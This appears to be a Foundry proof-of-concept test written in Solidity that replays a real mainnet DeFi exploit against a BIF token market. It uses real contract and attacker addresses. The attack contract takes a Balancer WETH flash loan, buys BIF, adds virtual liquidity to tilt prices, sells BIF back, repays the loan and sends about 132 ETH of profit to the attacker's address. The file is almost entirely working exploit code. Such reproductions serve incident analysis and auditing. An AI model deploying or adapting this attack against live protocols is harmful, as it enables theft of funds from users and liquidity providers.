
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 21184777;
    uint256 constant TX_TIMESTAMP = 1731573347;
    uint256 constant TX_BLOCK_NUMBER = 21184778;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        BalancerFlashAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (BalancerFlashAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = BalancerFlashAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new BalancerFlashAttack();
        }
    }

    function _prepareProfit(BalancerFlashAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(BalancerFlashAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(BalancerFlashAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACK_CONTRACT, attack, Addresses.BIF, "BIF", 6749153341821447559220422);
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "ETH", 132499658930377592956);
    }
}

contract BalancerFlashAttack {
    uint256 private constant FLASH_WETH_AMOUNT = 32560203560896180352774;
    uint256 private constant FIRST_BIF_AMOUNT = 13128660153709974200609869;
    uint256 private constant SECOND_BIF_AMOUNT = 13128094420971498850838719;
    uint256 private constant VIRTUAL_LIQUIDITY = 300000000000000000000;
    uint256 private constant BIF_SELL_AMOUNT = 6378941079150051291618297;
    uint256 private constant PROFIT_ETH_LIMIT = 132513467878004258374;

    function attack() external payable {
        _startFlashLoan();
    }

    function _startFlashLoan() internal {
        _readVaultWeth();
        _borrowVaultWeth();
    }

    function _readVaultWeth() internal view {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.BALANCER_VAULT);
    }

    function _borrowVaultWeth() internal {
        _recordVaultPre(_addressArray1(Addresses.WETH));
        if (address(this) != address(this)) {
            (bool ok,) = address(this)
                .call(abi.encodeWithSignature("recordVaultPre(address[])", _addressArray1(Addresses.WETH)));
            ok;
        }
        IBalancerVault(Addresses.BALANCER_VAULT)
            .flashLoan(address(this), _addressArray1(Addresses.WETH), _uintArray1(FLASH_WETH_AMOUNT), hex"");
    }

    function flashCallback() internal {
        _callbackDone[FLASH_CALLBACK] = true;
        _readBorrowedWeth();
        _unwrapBorrowedWeth();
        _buyBifQuote();
        _approveLiquidity();
        _addVirtualLiquidity();
        _readBifForSell();
        _approveQuoteMarket();
        _readBifForQuote();
        _sellBifQuote();
        _repayFlashLoan();
        _sendNativeProfit();
    }

    function _readBorrowedWeth() internal view {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function _unwrapBorrowedWeth() internal {
        IWETH(Addresses.WETH).withdraw(FLASH_WETH_AMOUNT);
    }

    function _buyBifQuote() internal {
        IQuoteMarket(Addresses.A_19C553_F441).buyQuote{value: FLASH_WETH_AMOUNT}(
            Addresses.BIF, FLASH_WETH_AMOUNT, 0
        );
        IERC20Like(Addresses.BIF).balanceOf(address(this));
    }

    function _approveLiquidity() internal {
        IERC20Like(Addresses.BIF).approve(Addresses.A_62F250_A1B5, FIRST_BIF_AMOUNT);
    }

    function _addVirtualLiquidity() internal {
        IVirtualLiquidity(Addresses.A_62F250_A1B5)
            .addVirtualLiquidity(Addresses.V_ETH, Addresses.BIF, VIRTUAL_LIQUIDITY, 0);
    }

    function _readBifForSell() internal view {
        IERC20Like(Addresses.BIF).balanceOf(address(this));
    }

    function _approveQuoteMarket() internal {
        IERC20Like(Addresses.BIF).approve(Addresses.A_19C553_F441, SECOND_BIF_AMOUNT);
    }

    function _readBifForQuote() internal view {
        IERC20Like(Addresses.BIF).balanceOf(address(this));
    }

    function _sellBifQuote() internal {
        IQuoteMarket(Addresses.A_19C553_F441).sellQuote(Addresses.BIF, BIF_SELL_AMOUNT, 0);
    }

    function _repayFlashLoan() internal {
        uint256 depositAmount = address(this).balance;
        if (depositAmount > FLASH_WETH_AMOUNT) depositAmount = FLASH_WETH_AMOUNT;
        if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        IERC20Like(Addresses.WETH).transfer(Addresses.BALANCER_VAULT, FLASH_WETH_AMOUNT);
    }

    function _sendNativeProfit() internal {
        uint256 nativeProfit = address(this).balance;
        if (nativeProfit > PROFIT_ETH_LIMIT) nativeProfit = PROFIT_ETH_LIMIT;
        (bool ok,) = payable(Addresses.ATTACKER_EOA).call{value: nativeProfit}("");
        if (!ok) {

        }
    }

    receive() external payable {
        if ((address(this) == address(this)
                    && (msg.sender == Addresses.A_19C553_F441 || msg.sender == address(this)))) {
            _quoteMarketCallback();
        }
    }

    function start(address veth, address quoteMarket, address liquidityPool, address bifToken, uint256 quoteId)
        external
        payable
    {
        veth;
        quoteMarket;
        liquidityPool;
        bifToken;
        quoteId;
        _startFlashLoan();
        return;
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external payable {
        tokens;
        amounts;
        feeAmounts;
        userData;
        if (!_callbackDone[FLASH_CALLBACK]) flashCallback();
        return;
    }

    fallback() external payable {
        _quoteMarketCallback();
    }

    function _quoteMarketCallback() internal {
        if (
            address(this) == address(this)
                && (msg.sender == Addresses.A_19C553_F441 || msg.sender == address(this))
        ) _consumeQuoteCb();
        return;
    }

    function _consumeQuoteCb() internal {
        uint256 ordinal = _nextQuoteCb(2);
        if (ordinal == 0) {
            return;
        }
        if (ordinal == 1) {
            return;
        }
    }

    bytes32 private constant FLASH_CALLBACK = keccak256("poc.flashCallback");
    mapping(bytes32 => bool) private _callbackDone;

    mapping(uint256 => uint256) private _quoteCallbackCursor;
    mapping(address => uint256) private _vaultPreBalance;

    function _nextQuoteCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _quoteCallbackCursor[index];
        _quoteCallbackCursor[index] = ordinal + 1;
    }

    function _recordVaultPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _vaultPreBalance[tokens[i]] = IERC20Like(tokens[i]).balanceOf(Addresses.BALANCER_VAULT);
        }
    }

    function recordVaultPre(address[] memory tokens) external {
        _recordVaultPre(tokens);
    }

    function vaultPreBalance(address token) external view returns (uint256) {
        return _vaultPreBalance[token];
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant UNI_V2 = 0x0634866dfd8F05019c2A6e1773dC64Cb5a5D3E6c;
    address internal constant A_19C553_F441 = 0x19C5538DF65075d53D6299904636baE68b6dF441;
    address internal constant V_ETH = 0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E;
    address internal constant ATTACK_CONTRACT = 0x351D38733DE3f1E73468d24401c59F63677000C9;
    address internal constant A_62F250_A1B5 = 0x62f250CF7021e1CF76C765deC8EC623FE173a1b5;
    address internal constant A_6B7E63_3B3A = 0x6B7e633FBDAf237bcFB8176BE04B0DD72dDa3B3A;
    address internal constant ATTACKER_EOA = 0x713d2b652e5f2a86233C57Af5341Db42a5559Dd1;
    address internal constant BIF = 0xAefEF41f5a0Bb29FE3d1330607B48FBbA55904CE;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IQuoteMarket {
    function buyQuote(address, uint256, uint256) external payable returns (uint256);
    function sellQuote(address, uint256, uint256) external returns (uint256);
}

interface IVirtualLiquidity {
    function addVirtualLiquidity(address, address, uint256, uint256) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}
